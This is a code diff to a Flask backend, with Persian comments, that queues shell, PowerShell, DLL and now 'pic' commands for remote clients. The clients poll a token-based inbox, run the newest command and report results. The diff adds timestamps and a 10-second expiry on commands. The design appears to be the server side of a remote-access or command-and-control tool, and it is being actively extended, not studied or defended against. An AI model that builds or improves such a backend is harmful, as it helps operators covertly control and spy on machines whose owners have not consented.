@@ -1,4 +1,5 @@
 from flask import Blueprint, jsonify, request, session, Response, render_template, redirect
+import time
 from ..models import User, Profile, db
 terminal_bp = Blueprint('terminal', __name__)
 
@@ -61,7 +62,7 @@ def save_command():
     command_type = data.get('type')
     command = data.get('command', '').strip()
 
-    if command_type not in ['say', 'cmd', 'ps', 'dll'] or not command:
+    if command_type not in ['say', 'cmd', 'ps', 'dll', 'pic'] or not command:
         return jsonify({'error': 'Invalid data'}), 400
 
     profile = Profile.query.filter_by(user_id=user.id).first()
@@ -83,8 +84,9 @@ def save_command():
         'id': new_id,
         'type': command_type,
         'msg': command,
-        'info': ""
-    }]
+        'info': "",
+        'timestamp': time.time()  # <--- این خط اضافه شود
+    }]  
 
     db.session.commit()
     print(f"new_id: {new_id}")
@@ -180,25 +182,46 @@ def inbox_new_messages(token):
     profile = Profile.query.filter_by(inbox_token=token).first()
     if not profile:
         return 'Invalid token', 404
-    print("last id : ", profile.last_seen_inbox_id)
-
+    
+    # اگر اینباکس خالی بود
     if not profile.inbox:
         return jsonify({}), 200
 
-    # فقط دستورات کاربر (بدون info)
+    # دریافت دستورات جدیدی که هنوز دیده نشده‌اند (بدون info، یعنی دستوراتی که باید اجرا شوند)
     new_commands = [
         msg for msg in profile.inbox
-        if msg.get('type') in ['say', 'cmd', 'ps', 'dll'] 
-        and not msg.get('info')  # فقط پیام‌های بدون info = کاربر
+        if msg.get('type') in ['say', 'cmd', 'ps', 'dll', 'pic'] 
+        and not msg.get('info') 
         and msg.get('id', -1) > (profile.last_seen_inbox_id or -1)
     ]
 
+    # اگر دستور جدیدی نیست
     if not new_commands:
         return jsonify({}), 200
 
+    # آخرین دستور را پیدا کن
     last_command = max(new_commands, key=lambda x: x['id'])
+
+    # --- بررسی انقضای زمانی (Expiration Logic) ---
+    current_time = time.time()
+    # دریافت زمان ثبت دستور (اگر نبود پیش‌فرض 0 که باعث انقضا می‌شود)
+    cmd_timestamp = last_command.get('timestamp', 0)
+    
+    # اگر بیشتر از 10 ثانیه گذشته باشد
+    if (current_time - cmd_timestamp) > 10:
+        print(f"Command {last_command['id']} EXPIRED (Age: {current_time - cmd_timestamp:.1f}s)")
+        
+        # بسیار مهم: نشانگر (last_seen) را جلو می‌بریم تا دفعه بعد دوباره این دستور چک نشود
+        profile.last_seen_inbox_id = last_command['id']
+        db.session.commit()
+        
+        # برگرداندن جیسون خالی (کلاینت کاری انجام ندهد)
+        return jsonify({}), 200
+    # ----------------------------------------------
+
+    # اگر دستور تازه بود، آن را ارسال کن و نشانگر را آپدیت کن
     profile.last_seen_inbox_id = last_command['id']
-    print("last command id: -------------      ", last_command['id'])
+    print("Sending command id:", last_command['id'])
     db.session.commit()
 
     return jsonify({
@@ -206,7 +229,7 @@ def inbox_new_messages(token):
         "command": last_command['msg'],
         "id": last_command['id']
     }), 200
-
+    
 @terminal_bp.route('/api/user/<token>/inbox/page')
 def inbox_page(token):
     profile = Profile.query.filter_by(inbox_token=token).first()
@@ -237,7 +260,7 @@ def get_command_info(command_id):
         return jsonify({'info': ''}), 200
 
     for msg in profile.inbox:
-        if msg.get('id') == command_id and msg.get('type') in ['say', 'cmd', 'ps', 'dll']:
+        if msg.get('id') == command_id and msg.get('type') in ['say', 'cmd', 'ps', 'dll', 'pic']:
             info = msg.get('info', '').strip()
             return jsonify({'info': info}), 200
 
